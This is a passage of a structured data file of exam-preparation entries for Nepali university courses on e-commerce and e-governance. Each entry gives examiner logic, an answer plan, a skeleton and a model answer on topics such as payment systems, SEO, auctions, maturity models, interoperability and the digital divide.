sides. The examiner wants the consumer-merchant contrast, so six definitions alone are incomplete.","how":"Open with the trust argument and one breach consequence. Then six dimensions, each with consumer versus merchant in the same bullet. Close with the mechanisms.","skel":["Why: trust, money, data, legal duty","Confidentiality, integrity, availability","Authenticity, non-repudiation, privacy","Consumer view vs merchant view per dimension","Mechanisms: TLS, OTP, tokenisation, audit"],"ans":"Security is essential because e-commerce separates buyer and seller, carries money and personal data over public networks and rests on trust; one breach means fraud, chargebacks, liability under the Electronic Transactions Act 2063 and lost reputation.\n• Confidentiality — card numbers and passwords readable only by intended parties; the consumer wants privacy, the merchant must protect the database and stay PCI-DSS compliant.\n• Integrity — order and amount unaltered in transit; the consumer is charged the shown price, the merchant receives the order he ships.\n• Availability — the site stays up in the Dashain sale; the consumer is not blocked, the merchant does not lose sales to downtime or DDoS.\n• Authenticity — the site is really Daraz and the buyer really the cardholder; the consumer checks the padlock, the merchant verifies CVV and OTP.\n• Non-repudiation — neither can deny the transaction; the merchant needs signed proof against chargebacks, the consumer proof of payment.\n• Privacy — consent, minimal collection, secure storage.\nMechanisms: TLS and certificates, OTP and 3-D Secure, tokenisation, role-based access, audit logs."},"ecom-60":{"u":3,"logic":"Tests three payment systems against each other with pros and cons. The examiner is checking that you do not treat e-cash and EBPP as the same thing, and that you can name EBPP's three models.","how":"Three blocks, each: what it is, how it works, advantages, disadvantages. Keep plus and minus on separate lines so they are countable.","skel":["Digital cash: tokens, blind signature, double spending","E-checks: signed instruction through clearing","EBPP: biller-direct, consolidator, bank-hosted","Advantages of each","Disadvantages and Nepal status"],"ans":"Digital cash — electronic tokens withdrawn from a bank and spent offline; blind signatures keep the payer anonymous.\n+ anonymity, micro-payments, no card, low fee. − double spending, laundering, low acceptance, no credit.\nE-checks — a paper cheque in electronic form: the payer signs the instruction (payee, amount, date) digitally and it clears through the banking system (FSTC model).\n+ uses bank accounts and cheque law, suits large B2B sums, auditable, no card fee. − needs PKI for both parties, slow clearing, not for micro-payments, needs legal recognition.\nEBPP — bills presented and paid online in three models: biller-direct (the utility's portal), consolidator (eSewa, Khalti), bank-hosted (connectIPS).\n+ faster payment, lower printing and postage cost, fewer errors, online history. − needs standards and bank integration, awareness, dispute handling, connectivity.\nIn Nepal wallets and connectIPS dominate bill payment; cards stay low."},"ecom-61":{"u":1,"logic":"Tests the three dimensions — product, process, delivery agent — and whether you can classify real cases. Students answer 'pure is online, partial is offline', which is wrong.","how":"Define pure using all three dimensions in one line, then partial with three worked variants. End with why partial dominates Nepal.","skel":["Criterion: product, process, delivery agent","Pure: all three digital, e-book, software","Partial: physical product, courier","Partial: browse shop, pay by QR","Why partial dominates Nepali retail"],"ans":"The distinction is the degree of digitisation of product, process and delivery agent.\nPure e-commerce — all three digital: the good is information or software, ordered and delivered online. Examples: an e-book on Kindle, a Netflix subscription, a Daraz mobile recharge. Nothing physical moves, so marginal cost is near zero.\nPartial e-commerce — at least one dimension is physical:\n• Ordered online, delivered by courier — Daraz sends a shirt to Pokhara.\n• Browsed in a shop, paid online — scanning a Fonepay QR with eSewa.\n• Ordered online, collected in store — click-and-collect.\nPartial dominates Nepali retail because goods, logistics and cash are physical, which is why couriers and cash on delivery matter."},"ecom-62":{"u":2,"logic":"Porter's firm value chain versus the networked value web. The trap is treating them as synonyms; the examiner wants the shift from a linear chain inside one firm to a network across firms.","how":"Two definitions with primary and support activities named, then the value web as a hub diagram, then three significance bullets. Draw both figures.","skel":["Firm value chain: primary plus support","Margin = value minus activity cost","Value web: multi-firm networked value","Significance: locate IT cost savings","Significance: outsourcing, ecosystem competition"],"ans":"Firm value chain (Porter) — the activities inside one firm that create customer value: primary (inbound logistics, operations, outbound logistics, marketing and sales, service) and support (infrastructure, HR, technology, procurement). Margin is value minus cost.\nFirm value web — several firms, suppliers, partners and customers coordinating through IT as nodes in a network, with two-way information flow in near real time.\nSignificance:\n• Shows where IT cuts cost or adds differentiation, e.g. inventory and delivery tracking.\n• Explains outsourcing of non-core activities to specialists.\n• Explains ecosystem competition: Daraz with sellers, couriers and eSewa against another ecosystem.\n• Justifies ERP and EDI integration, faster response and mass customisation.\nDraw the chain as five primary boxes with four supports above; the web as a hub with nodes."},"ecom-63":{"u":4,"logic":"Tests the commercial reason for catalogues and the static-dynamic distinction on four axes: scale, update, search and cost. Answers that only say 'static is HTML' miss the trade-off.","how":"Two lines on why catalogues matter, then static versus dynamic on scale, update, features and cost, then one example of each.","skel":["Why: search, filters, stock accuracy, SEO","Static: hand-coded HTML, cheap, no scale","Dynamic: generated from database on request","Compare update, search, personalisation, cost","Example: 20 SKUs static, Daraz dynamic"],"ans":"A catalog matters because it is what customers search, compare and buy from: it drives site search, filters, cart, stock accuracy, SEO landing pages and analytics; a weak catalog means failed searches and abandoned carts.\nStatic catalog — each page hand-coded in HTML.\n+ simple, cheap, fast, no database. − no scale, manual price and stock updates, no search, filters or personalisation.\nDynamic catalog — pages generated on request from a product database.\n+ thousands of SKUs, instant updates, faceted search, personalisation, feeds for marketplaces and ads. − needs database, app server, caching and skill.\nExample: twenty handicraft SKUs can be static; Daraz's millions must be dynamic."},"ecom-64":{"u":5,"logic":"Tests three distinct attacks: theft of credentials, impersonation of a trusted party, and silent redirection. Students merge spoofing and pharming; the difference is the lure — pharming needs none.","how":"Define identity theft with Nepali data types, then spoofing (with lure) and pharming (no lure, DNS) as separate blocks, then defences. The no-lure point is the mark.","skel":["Identity theft: stolen KYC, card, OTP","Consequences: fake accounts, loans, carding","Spoofing: fake sender, caller ID, hotspot","Pharming: DNS poisoning, no lure needed","Defence: DNSSEC, HTTPS, 2FA, reporting"],"ans":"Identity theft is the fraudulent use of another person's identifying information — name, citizenship or PAN number, card and KYC details, OTP — to open accounts, take loans or buy goods in that name.\nSpoofing impersonates a trusted entity: a forged sender address (phishing), fake caller ID (vishing), cloned Wi-Fi hotspot or spoofed IP. A shopper gets a mail resembling Daraz or eSewa, enters card details and OTP on the fake page, and the attacker spends in the victim's name; the merchant absorbs chargebacks and the customer loses trust.\nPharming needs no lure: the attacker poisons DNS records or the hosts file so the correct URL (esewa.com.np) resolves to a fake server; even a careful user reaches the clone, so credentials are harvested at scale and the brand suffers.\nDefence: DNSSEC, HTTPS with certificate checks and HSTS, 2FA, never sharing OTPs, reporting under the Electronic Transactions Act."},"ecom-65":{"u":6,"logic":"Tests three Pinterest ad formats and whether you know which is organic metadata, which is paid distribution and which is creative format. Students often describe all three as 'pins that promote'.","how":"Three headed bullets: rich (organic, metadata), promoted (paid, targeting), cinematic (motion creative). One handicraft campaign sentence ties them together.","skel":["Pinterest is visual discovery; pins are units","Rich pins: live metadata, organic","Promoted pins: paid, targeted, CPM/CPC","Cinematic pins: short motion creative","Measure saves, clicks, conversions"],"ans":"Pinterest is visual discovery, and pins are its ad unit.\n• Rich pins — organic pins that pull live metadata through meta tags or the API: product price and availability, article headline, recipe ingredients. They update automatically and show a price, so click-through is higher.\n• Promoted pins — paid ads in the home feed, search and related pins, targeted by keyword, interest, actalike audience and demographics, billed by CPM, CPC or CPA.\n• Cinematic pins — short motion pins of a few seconds that play automatically; motion stops the scroll, so they suit new arrivals and seasonal campaigns.\nFor a Nepali handicraft seller: rich pins on products, promoted pins to the Dashain audience, cinematic pins for the new collection; measure saves, clicks and conversions."},"ecom-66":{"u":6,"logic":"Tests three funnel metrics and whether you can compute them. The examiner wants the CTR formula with numbers and the distinction between impressions, page views and unique visitors.","how":"One bullet per metric with definition, formula and what it diagnoses, then a worked example down the funnel. Always show clicks over impressions times 100.","skel":["Impressions: display count, CPM base","CTR = clicks / impressions x 100","Page views vs unique visitors","Funnel: impression to purchase","Worked example with numbers"],"ans":"• Impressions — times an ad or page is displayed, clicked or not; one user seeing it three times counts three. It measures visibility and is the CPM base.\n• CTR — clicks divided by impressions times 100. 2,000 clicks on 100,000 impressions is 2 per cent; a low CTR means wrong targeting or weak copy.\n• Page views — times a page is loaded; repeat loads count again, while unique visitors count people. It measures traffic and needs bounce rate and pages per session to mean anything.\nFunnel: impression → click → page view → add to cart → purchase.\nExample: 100,000 impressions, 2,000 clicks (CTR 2 per cent), 1,800 landing views, 180 add-to-cart, 90 orders — 5 per cent conversion."},"ecom-67":{"u":7,"logic":"The mirror of the on-page question, so it tests whether you can separate authority building from page editing. Students repeat on-page points and lose the marks; off-page is links, mentions and citations.","how":"Three lines on why SEO matters (free, compounding, high intent), then five off-page bullets. Name PageRank and one authority link example.","skel":["Why: free clicks, compounding, high intent","Backlinks: quality, relevance, anchor text","Guest posts and expert articles","Citations, directories, Google Business Profile","Social signals, reviews, digital PR"],"ans":"SEO matters because organic results take most clicks, cost nothing per click and compound, while paid ads stop when the budget stops; ranking for 'buy laptop in Nepal' brings free high-intent buyers and lowers acquisition cost.\nOff-page SEO builds authority outside your own pages:\n• Backlinks from relevant, reputable sites — a supplier, news portal, chamber of commerce; quality and relevance beat quantity, anchor text stays natural, link farms are penalised.\n• Guest posts and expert articles with an author bio link.\n• Directory and local citations — Google Business Profile with consistent name, address and phone.\n• Social signals and brand mentions — shares, influencer reviews, press coverage.\n• Reviews on third-party platforms, digital PR and broken-link building.\nPageRank explains it: a link from an authority page passes more value. Draw authority site → your page."},"ecom-68":{"u":7,"logic":"Tests analytics as a decision tool, not a dashboard tour. Full marks need how the data is collected (tag, events, UTM) and which report answers which question, for both Google and social.","how":"One line on significance, then GA4 setup and reports, then social metrics with the engagement-rate formula. Close with a decision example.","skel":["Why: measure channels, funnel, ROI","GA4: tag, events, e-commerce, conversions","UTM tagging; acquisition and engagement reports","Social: reach, engagement rate, sentiment","Decision example: shift budget"],"ans":"Analytics matters because you cannot improve what you do not measure: it shows which channels and pages produce revenue, exposes funnel leaks such as cart abandonment, and proves return on investment.\nGoogle Analytics (GA4): place the tag or Tag Manager on every page, define events (view_item, add_to_cart, purchase), send e-commerce data through the dataLayer, mark conversions and tag campaigns with UTM parameters. Read the Acquisition, Engagement, Monetisation and Retention reports.\nSocial analytics: native tools (Meta Insights, X Analytics) plus UTMs; measure reach, impressions, engagement rate (engagements divided by reach), follower growth, click-throughs and sentiment; A/B test creative.\nExample: Facebook sends 60 per cent of traffic but Google converts three times better, so budget shifts."},"ecom-69":{"u":3,"logic":"Tests the five auction mechanisms and the rule that distinguishes each. Students describe only English and Dutch; Vickrey's second-price rule is the usual gap and the easiest mark on the page.","how":"One bullet per type with the rule and one use case, then platform requirements. Write 'Vickrey pays the second-highest bid' early and clearly.","skel":["Auction: price set by competitive bidding","English ascending, Dutch descending","First-price sealed bid","Vickrey second-price sealed","Double auction; platform safeguards"],"ans":"An auction sets the price by competitive bidding on a platform rather than by the seller.\n• English (ascending, open) — bidders see and raise bids, highest wins at close; suits unique or used goods and art (eBay, Hamrobazar). Sniping is a risk, so platforms use a soft close.\n• Dutch (descending) — price starts high and falls until a bidder accepts; first acceptor wins; used for perishables, flowers, surplus stock.\n• First-price sealed bid — one secret bid each, highest wins and pays his own bid; common in procurement tenders, where bidders shade.\n• Vickrey (second-price sealed) — highest wins but pays the second-highest bid, so truthful bidding is dominant; used in ad-slot and spectrum auctions.\n• Double auction — many buyers and sellers post bids and asks, matched by the platform, as in stock exchanges.\nNeeds: bidder verification, escrow, shill detection, integrated eSewa or Khalti payment."},"egov-1":{"u":1,"logic":"Tests whether you can name current directions of e-governance growth and prove them with country examples, not just list technologies. Examiners look for the developed/developing contrast.","how":"Five headings — mobile, identity, cloud, open data, participation — then one developed and one developing example under each. Draw a ladder from information to transformation.","skel":["Define e-governance growth briefly","Five trends with a tool named each","Developed examples: Estonia, Denmark, UK","Developing examples: India, Nepal","Close on binding constraints: divide, literacy"],"ans":"Global e-governance growth is driven by five shifts:\n• Mobile-first delivery: services move from desktop portals to apps and SMS. India's UMANG and Nepal's Nagarik App bundle many services into one app.\n• Digital identity as the base layer: Aadhaar in India, the National ID in Nepal, e-Estonia's ID-card — every service authenticates against one identity.\n• Cloud and shared infrastructure: governments rent capacity instead of building silos, e.g. government cloud programmes and Nepal's Government Integrated Data Centre.\n• Open data and interoperability: data portals, one-stop gateways and API integration replace departmental islands.\n• Participation and AI: e-petitions, online consultation, chatbots and analytics for policy.\nDeveloped nations lead in transformation — Estonia's e-Residency, Denmark's mandatory digital post, UK's GOV.UK single domain. Developing nations leapfrog with mobile and biometric identity, but connectivity, literacy and the digital divide bind them; India's Common Service Centres and Nepal's telecentres are the standard fix. Draw the ladder information → interaction → transaction → transformation."},"egov-2":{"u":2,"logic":"Probes whether you understand the five models as different information flows rather than synonyms. The comparison half is where most students lose marks.","how":"Define digital governance model, draw the five arrows, then spend the body on critical flow and finish with a four-point comparison table in words.","skel":["Define model; list five models","Critical flow: selective, high-value information","Who receives it: media, auditors, courts","Example: asset and tender disclosure","Compare with the other four models"],"ans":"A digital governance model is a framework describing how ICT moves information or authority between government, citizens and watchdog institutions. The five standard models are broadcasting, critical flow, comparative analysis, mobilisation and lobbying, and interactive service.\nCritical Flow Model: high-value, sensitive information is channelled deliberately to those who can act on it — media, auditors, courts, opposition, activists — instead of being broadcast to everyone. The flow is selective, not one-to-many.\n• Basis: information asymmetry is the root of corruption; whoever holds information holds power.\n• Mechanism: publish MPs' asset declarations, tender documents, pollution readings, audit reports and RTI disclosures on a portal.\n• Example: CIAA asset disclosures and open budget/tender data in Nepal; India's RTI portals.\nDifference: broadcasting pushes general information to all and stops; critical flow targets the few with power to punish; comparative analysis shames by comparison; mobilisation flows citizen to government; interactive service closes the loop with a transaction. Critical flow is the pure accountability model — it changes behaviour by exposure, with no transaction at all."},"egov-3":{"u":2,"logic":"Tests ordered recall of the five levels plus the characteristics that actually change between them. Students often memorise names but cannot say what improves.","how":"Draw a five-step staircase, label each level, then one example per step. End with the one line: integration, personalisation, security and participation rise with maturity.","skel":["Define maturity model in one line","Levels 1-2: information, enhanced","Levels 3-4: interactive, transactional","Level 5: connected, seamless","Characteristics that rise across levels"],"ans":"The e-governance maturity model describes the stages a government passes through as ICT use deepens — from putting information online to integrating services across departments. The widely used model has five levels:\n• Level 1 Emerging (Information): static website, brochures, notices. One-way only.\n• Level 2 Enhanced: larger content, searchable databases, downloadable forms, still no interaction.\n• Level 3 Interactive: two-way — e-mail contact, online forms, status enquiry, simple transactions begin.\n• Level 4 Transactional: the complete service online with secure payment and authentication — certificate issued, tax paid, licence renewed. Example: IRD e-filing, e-passport appointment.\n• Level 5 Connected (Seamless): integrated single window across departments, data entered once, proactive and participatory services. Example: Nagarik App drawing identity, tax and land data together.\nCharacteristics that rise with each level: integration across agencies, personalisation of service, security and authentication strength, back-office reform, and citizen participation. Maturity is judged service by service, not by a national claim. Draw the five steps as a staircase with an arrow upward."},"egov-4":{"u":4,"logic":"Tests whether you see law as part of the e-governance system, not a separate subject. Weak answers list offences instead of explaining why law enables digital delivery.","how":"Open with 'trust layer', then six bullets: validity, deterrence, data protection, enabling services, dispute remedy, cross-border trust. One Nepali Act name is enough.","skel":["Define cyber law as trust layer","Legal validity of e-records and signatures","Deterrence through defined offences","Protects citizen data and privacy","Enables e-services; provides remedy"],"ans":"Cyber law is the legal framework that recognises electronic records, signatures and transactions and punishes their misuse. In e-governance it is the trust layer without which digitisation stays unsafe.\n• Legal validity: an online certificate or payment binds only if electronic records and digital signatures are recognised — Nepal's Electronic Transactions Act, 2063 does this.\n• Deterrence: it defines offences — unauthorised access, data tampering, forgery, identity misuse, denial of service — and prescribes punishment.\n• Protects citizen data: agencies holding personal data become accountable for confidentiality and breach.\n• Enables e-services: e-filing, e-procurement and payment need authentication, non-repudiation and audit trails.\n• Remedy: electronic evidence is admissible and adjudicating machinery exists.\n• Trust abroad: supports data exchange, outsourcing and investment.\nWithout cyber law, e-governance stays a pilot — nobody signs, nobody pays, nobody is punished."},"egov-5":{"u":5,"logic":"Tests application, not definition. The examiner wants you to map warehouse-plus-mining onto two named sectors with concrete uses.","how":"One line of definition for both terms, then two blocks — agriculture and rural development — with three uses each. Close with 'warehouse stores, mining discovers'.","skel":["Define warehouse and mining in one line each","Agriculture: yield forecast, pest alert, subsidy targeting","Rural: beneficiary selection, leakage detection","Rural: infrastructure gap mapping","Nepali example; close on evidence-based policy"],"ans":"A data warehouse is a subject-oriented, integrated, time-variant, non-volatile store built for decision support. Data mining extracts unknown but useful patterns from it by classification, clustering, association and prediction.\nAgriculture:\n• Crop yield forecasting by correlating rainfall, soil, seed variety and past yields — used on district production data by Nepal's agriculture ministry.\n• Pest and disease early warning from weather plus outbreak history.\n• Subsidy targeting: identifying genuine smallholders instead of ghost beneficiaries on fertiliser lists.\nRural development:\n• Beneficiary selection by clustering households on land, income and caste data.\n• Leakage detection — duplicate or fake beneficiaries across social security schemes.\n• Infrastructure gap mapping: which wards lack a road, water or a health post.\n• Monitoring poverty, migration and remittance trends for local planning.\nWrite the logic line: the warehouse stores, mining discovers, policy acts."},"egov-6":{"u":5,"logic":"Tests whether you can distinguish a national warehouse from an ordinary database and justify it in governance terms. Students drift into describing ETL only.","how":"Definition plus the four Inmon characteristics, then five governance benefits, then one Nepali example. Keep the benefits as bullets — that is where the marks sit.","skel":["Define national data warehouse","Four characteristics: subject, integrated, time, non-volatile","Single source of truth; planning and budgeting","Fraud detection, performance, open data","Nepal: census and price warehouses"],"ans":"A national data warehouse is a central, integrated repository consolidating data from many government source systems — census, tax, land, health, education — through ETL, and serving it to ministries for analysis rather than daily transactions.\nCharacteristics: subject-oriented, integrated, time-variant and non-volatile.\nHow it improves governance:\n• Single source of truth: ends conflicting figures between ministries.\n• Evidence-based planning and budgeting: allocation follows real district indicators.\n• Trend analysis and forecasting for policy — enrolment, inflation, migration, disease.\n• Fraud detection by cross-matching schemes, e.g. pension lists against death records.\n• Performance measurement and SDG monitoring through dashboards.\n• Transparency: publishable aggregates feed open data and research.\nNepal: the census warehouse and the essential-commodity price warehouse, with the National Statistics Office as the statistical backbone. Value depends on data quality at source."},"egov-7":{"u":4,"logic":"Tests whether security is understood as a managed cycle rather than a product list. The examiner rewards governance and risk language, not just firewalls.","how":"Four blocks: governance, risk, layered controls, operations. Draw concentric layers around the data layer; name ISO 27001 once.","skel":["Define security model as policy plus controls","Governance: policy, roles, classification","Risk: threat x vulnerability x impact","Layered controls: physical to data","Operations: monitor, respond, audit, improve"],"ans":"An e-governance security model is the structured set of policies, controls and processes that protect government systems, data and citizen identity while keeping services available.\nFour dimensions:\n• Governance: security policy, a named owner (CISO), data classification, legal compliance.\n• Risk management: list assets, then risk = threat × vulnerability × impact, and treat, transfer, avoid or accept.\n• Layered controls: physical (data-centre access, CCTV); network (firewall, IDS/IPS, VPN, segmentation); host (patching, least privilege); application (secure coding, authentication); data (encryption at rest and in transit, backup); identity (MFA, RBAC, PKI).\n• Operations: monitoring and SIEM, incident response, audit, awareness training, continuous PDCA improvement.\nStandards: ISO/IEC 27001 for the ISMS, NIST CSF. Nepal: the Cyber Security Policy 2077 and National CERT set direction. The model is people plus process plus technology, not technology alone."},"egov-8":{"u":3,"logic":"Tests the single-window idea at the technical level. Most answers give a definition and stop; the marks are in naming the standards and the governance body.","how":"Define as 'rules that let systems talk', list five components, then four importance points. Draw two departments connected by an API bus.","skel":["Define interoperability framework","Components: identifiers, schemas, APIs","Identity, payment, signature, security standards","Governance body approves standards","Importance: single window, cost, consistency"],"ans":"An interoperability framework is a set of standards, policies and shared components that let different government systems, built by different vendors at different times, exchange data without manual re-entry.\nComponents:\n• Data standards: common code lists and unique identifiers for citizen, business, land parcel and vehicle.\n• Technical standards: XML/JSON schemas, web services and APIs, middleware or an enterprise service bus.\n• Shared services: identity federation and single sign-on, e-payment gateway, digital signature.\n• Security and privacy standards, with audit and consent rules.\n• A governance body that approves standards and arbitrates between agencies.\nWhy important:\n• Single window: the citizen submits data once and departments share it.\n• Lower cost and faster rollout, with no duplicate databases or vendor lock-in.\n• Consistency: one citizen record, one land parcel record.\n• Enables the national data warehouse and analytics.\nNepal: the National ID as linking key, Nagarik App as the front end. Without the framework, the citizen remains the integration layer."},"egov-9":{"u":2,"logic":"Tests the link between each model and a specific good-governance value. Students list governance principles without attaching a model to each.","how":"Pair each of the five models with one governance value in a single line, then two Nepali examples. Memorise the pairing, not the prose.","skel":["List the eight good-governance values","Broadcasting gives transparency","Critical flow gives accountability","Comparative analysis gives effectiveness","Mobilisation gives participation; interactive gives responsiveness"],"ans":"Good governance rests on transparency, accountability, participation, responsiveness, effectiveness and equity. Each e-governance model delivers one of these:\n• Broadcasting → transparency: published budgets, decisions and entitlements put information in the public domain.\n• Critical flow → accountability: asset declarations, tenders and audit reports reach media, courts and watchdogs who can act.\n• Comparative analysis → effectiveness: district rankings and citizen report cards create pressure to improve.\n• Mobilisation and lobbying → participation: e-petitions and online consultation bring citizen voice into policy.\n• Interactive service → responsiveness and efficiency: online applications, tracked grievances and e-payment cut delay.\nNepal: Hello Sarkar for responsiveness, CIAA disclosures for accountability, Nagarik App for efficiency. The reform is in process and power, not in the portal."},"egov-10":{"u":3,"logic":"Tests a definition plus one named pillar of e-readiness in depth. Students blur e-readiness with digitisation and forget the data layer entirely.","how":"Define e-readiness with its pillars, then switch to data-system preparedness as six components. Use the word 'trustworthy data' as the bridge sentence.","skel":["Define e-readiness; name EGDI","Data system preparedness defined","Core registries and unique identifiers","Standards, quality, storage, security","Open data; Nepal's gap"],"ans":"E-readiness is the degree to which a country is prepared to participate in the digital economy and deliver services electronically. It is measured across infrastructure, affordability, human skills, business environment, legal framework and government adoption — indices such as the UN EGDI and the Networked Readiness Index.\nData system infrastructural preparedness asks whether government can supply trustworthy, shareable data. Components:\n• Core registries — citizen/national ID, land, business, vehicle, tax — each with a unique identifier.\n• Data standards, metadata and common code lists.\n• Data quality: completeness, accuracy, de-duplication, validation at source.\n• Storage and integration: databases, warehouse, APIs, backup and disaster recovery.\n• Security and privacy: access control, encryption, retention, consent.\n• Open data so the data is reused.\nNepal: the National ID and the integrated data centre are steps forward; duplicate registers and incomplete digitisation remain the gap."},"egov-11":{"u":6,"logic":"Tests concrete national knowledge. Vague answers about 'digitisation in Nepal' score nothing; two named initiatives with measurable impact score full marks.","how":"Pick Nagarik App and online land revenue, write benefit then limitation for each, and end with the shared lesson about back-office reform.","skel":["Nagarik App: one app, many services","Its impact and its limits","Online land revenue and computerised records","Impact: less forgery, faster registration","Lesson: front end needs digitised back office"],"ans":"• Nagarik App (2077): one mobile app for PAN, citizenship details, driving licence, passport, bluebook, voter ID, remittance and utility payment, and grievance filing. Impact: single identity-based sign-on, less queueing, a usable digital identity on the phone. Limits: low digital literacy and incomplete backend integration push users back to the counter.\n• Online land revenue and computerised land records (Department of Land Management and Archive): revenue payment and record lookup at land revenue offices. Impact: fewer middlemen and forged receipts, faster registration, searchable ownership, fewer disputes. Limits: legacy paper records, thin staffing, weak rural connectivity.\nOther options: IRD e-filing, e-passport appointment, Hello Sarkar, online company registration.\nThe shared lesson: digitising the front desk works only when the back-office register is digitised too."},"egov-12":{"u":3,"logic":"Short notes test two separate definitions with enough substance to fill half a page. The trap is writing one line each and running out of marks.","how":"Two mini-answers of about five lines each. For cloud governance use policy elements; for the life cycle use the six stages as a loop.","skel":["Cloud governance: definition","Its elements: residency, SLA, exit, audit","Life cycle: definition","Six stages in order","Draw the cycle as a loop"],"ans":"Cloud Governance\nThe policy framework for government cloud adoption — who may buy cloud, which data may leave the country, how it stays secure and reversible. Elements: adoption and procurement policy; data residency and classification; security, encryption and audit rights; SLA and availability; cost control and chargeback; open standards against lock-in; an exit strategy with data portability; compliance with cyber law. Nepal: shared hosting from the Government Integrated Data Centre, though a full policy still needs residency and exit clauses.\nE-Government Life Cycle\nThe staged path of a project:\n• Initiation — vision, feasibility, buy-in.\n• Planning and design — process re-engineering, architecture, procurement.\n• Implementation — build, test, train, migrate data.\n• Operation — live services, support, monitoring.\n• Monitoring and evaluation — usage, cost, citizen feedback.\n• Improvement and expansion — scale, integrate, retire.\nDraw it as a loop: evaluation feeds planning."},"egov-13":{"u":1,"logic":"Two-part long question: life cycle recall plus an applied inclusion argument for Nepal. The second half separates thinking students from memorisers.","how":"Six stages as a loop, then a divide section with access, affordability, skills, language and inclusion. One Nepali example per bullet.","skel":["Life cycle: six stages, looped","One line of activity per stage","Digital divide in Nepal: who is excluded","Five inclusion levers with examples","Rule: keep a non-digital channel open"],"ans":"The e-government life cycle is the sequence of stages a project passes through from idea to continuous improvement.\n• Initiation: identify the need, set the vision, test feasibility — technical, financial, legal — and find a champion.\n• Planning and design: re-engineer the process before computerising it; architecture, standards, procurement, funding.\n• Implementation: development, testing, data migration, training, pilot in a few offices.\n• Operation and delivery: live service, help desk, uptime and usage monitoring.\n• Monitoring and evaluation: cost, adoption, satisfaction, audit findings.\n• Improvement and expansion: scale, integrate, retire what fails. Draw it as a loop.\nBridging the digital divide — hills, mountains, Madhesh, Karnali, women, the elderly and the poor are least connected; app-only e-governance widens the gap:\n• Access: community e-service centres, rural broadband, offline kiosks.\n• Affordability: subsidised data, zero-rated government portals.\n• Skills: digital literacy drives, assisted counters.\n• Language: Nepali and local-language interfaces, voice and IVR.\n• Inclusion by design: doorstep service for the elderly and disabled.\nExamples: Nagarik App with ward-level assisted counters; Hello Sarkar by phone; telemedicine in remote health posts. Keep a non-digital channel open until adoption is universal."},"egov-14":{"u":3,"logic":"Tests whether you can separate architecture (layers), interoperability (standards) and infrastructure (network and compute) instead of merging them into one list.","how":"Draw the six-layer stack first, then one paragraph each on interoperability, network and computing, with one Nepali project under each.","skel":["Define architecture; draw six layers","Interoperability framework and why crucial","Network infrastructure with Nepal example","Computing infrastructure with Nepal example","Security and standards cross-cut all layers"],"ans":"E-government architecture is the layered blueprint of how citizens reach services and how back-end systems cooperate. Layers: access (portal, mobile app, kiosk, service centre) → service (e-services, workflows, G2C/G2B/G2G) → application (business systems, GIS, ERP) → integration (APIs, middleware, ESB) → data (registries, warehouse) → infrastructure (network, compute, storage). Security and standards cut across every layer.\nInteroperability framework: the standards and governance that let layers and departments exchange data — common identifiers, XML/JSON schemas, APIs, identity federation, e-payment gateway, digital signature. Crucial because it delivers the single window, stops repeated data entry, lowers cost, enables analytics and prevents vendor lock-in.\nNetwork infrastructure: national fibre backbone, provincial and district links, LAN/WAN and intranet, internet gateway with redundancy, last-mile and rural connectivity, bandwidth and security appliances. Nepal: Nepal Telecom's fibre backbone, links to the Government Integrated Data Centre, and NREN for campuses.\nComputing infrastructure: servers, virtualisation, cloud (IaaS/PaaS/SaaS), data centres with power, cooling and disaster recovery, end-user devices, service desk. Nepal: the Government Integrated Data Centre hosting ministry sites and a cloud-first preference for new projects. Without these two, applications have nowhere to run and no way to talk."},"egov-15":{"u":2,"logic":"Tests two models plus a live political application. The youth-movement half rewards a student who can connect a model to an event without becoming an activist essay.","how":"Define both models with direction arrows, give one Nepali example each, then four concrete participation mechanisms and one caution about voice without response.","skel":["Mobilisation model: citizen to government","Tools and examples; its weakness","G2C2G model: closed loop","Example: grievance with tracking","Pair voice with a mandatory response"],"ans":"Mobilisation and Lobbying Model: ICT is used by citizens and civil society to organise, build coalitions and press decision-makers.\n• Direction: citizen → government, bottom-up.\n• Tools: e-petitions, social-media campaigns, online consultation on bills, crowdfunded advocacy.\n• Purpose: agenda setting and collective voice.\n• Example: campaigns against unregulated sand mining, consultation on IT bills, social-media mobilisation during the 2082 Gen-Z protests.\n• Weakness: mob dynamics, misinformation, exclusion of the offline poor.\nG2C2G Interactive Service Model: government delivers a service and the citizen's response feeds back into the process.\n• Direction: two-way, closed loop.\n• Tools: online application, payment, grievance with tracking number, feedback rating, e-voting.\n• Example: Nagarik App and Hello Sarkar, IRD e-filing with refund status.\n• Strength: responsiveness; the highest maturity of the five.\nEnhancing participation: the Gen-Z protests showed citizens organise online but lack a formal channel. Pair voice with response — a petition threshold forcing a published reply and timeline, draft laws open for comment, grievance IDs that must be closed, public spending dashboards. Otherwise online anger lands nowhere."},"egov-16":{"u":1,"logic":"Tests a distinction students routinely collapse: electronic is the umbrella, online is the internet subset. The SMART half checks mnemonic recall with justification.","how":"Contrast on channel and completeness with one example each, then expand SMART letter by letter with a Nepali service per letter.","skel":["Electronic delivery: any electronic channel","Online delivery: internet subset, end to end","Difference: channel and completeness","SMART expanded letter by letter","One example per letter; conclude"],"ans":"Electronic service delivery is the broad term: any service delivered through electronic channels — portal, mobile app, SMS, IVR, call centre, kiosk, ATM, common service centre, digital TV. Online service delivery is the subset delivered over the internet, ideally end to end.\nDifference: channel and completeness. A form downloaded and submitted at a counter is electronic but not online; a ration card applied for, verified and issued through a portal is both. Electronic delivery can be offline-assisted by a kiosk operator; online delivery assumes the citizen is connected.\nSMART government — simple, moral, accountable, responsive, transparent:\n• Simple: one form, one window — Nagarik App.\n• Moral: rules applied uniformly, discretion reduced.\n• Accountable: an audit trail on every transaction.\n• Responsive: tracked grievances with a time limit — Hello Sarkar.\n• Transparent: fees, rules and status visible online.\nE-governance promotes SMART government by digitising the process, not just the form: every step leaves a record, so delay and exception become visible."},"egov-17":{"u":2,"logic":"Tests the five levels plus a judgement about Nepal. The judgement half is graded on evidence, so a bare 'level 3' earns little.","how":"Name the five levels in one line each, then place Nepal as 'between 3 and 4, unevenly' with three level-4 examples and one gap.","skel":["Five levels named in order","One distinguishing feature each","Nepal: between interactive and transactional","Level-4 islands: tax, passport, company registration","Gap: silos and repeated data block level 5"],"ans":"The five maturity levels:\n1. Emerging (Information) — static website, one-way information.\n2. Enhanced — searchable databases, downloadable forms, still one-way.\n3. Interactive — two-way: e-mail, online forms, status enquiry.\n4. Transactional — the whole transaction online with secure authentication and payment.\n5. Connected (Seamless) — cross-department integration, single window, no repeated data, proactive services.\nNepal sits between level 3 and 4, unevenly. Islands of level 4 exist — IRD e-filing and e-payment, e-passport appointment, online company registration, land revenue payment, several Nagarik App services. Most 